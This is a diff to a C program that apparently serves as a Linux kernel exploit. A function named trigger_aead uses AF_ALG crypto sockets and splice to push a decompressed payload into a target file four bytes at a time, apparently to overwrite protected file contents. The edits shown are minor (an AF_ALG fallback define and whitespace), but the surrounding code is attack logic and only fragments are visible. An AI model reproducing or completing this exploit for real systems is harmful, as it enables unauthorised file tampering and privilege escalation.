@@ -8,6 +8,10 @@
 #include <linux/if_alg.h>
 #include <zlib.h>
 
+#ifndef AF_ALG
+#define AF_ALG 38
+#endif
+
 #ifndef SOL_ALG
 #define SOL_ALG 279
 #endif
@@ -123,6 +127,7 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
         close(sock);
         return;
     }
+
     size_t splice_len = offset + 4;
     int pipefd[2];
     if (pipe(pipefd) < 0) {
@@ -131,8 +136,8 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
         close(sock);
         return;
     }
-    lseek(file_fd, 0, SEEK_SET);
 
+    lseek(file_fd, 0, SEEK_SET);
     ssize_t ret = splice(file_fd, NULL, pipefd[1], NULL, splice_len, SPLICE_F_MOVE);
     if (ret != (ssize_t)splice_len) {
         perror("splice file->pipe");
@@ -145,6 +150,7 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
 
     close(pipefd[0]);
     close(pipefd[1]);
+
     char recv_buf[8192];
     recv(conn, recv_buf, sizeof(recv_buf), 0);
 
@@ -183,7 +189,6 @@ int main() {
         free(decompressed);
         return 1;
     }
-
 
     for (size_t i = 0; i + 4 <= decomp_len; i += 4) {
         trigger_aead(file_fd, i, decompressed + i);
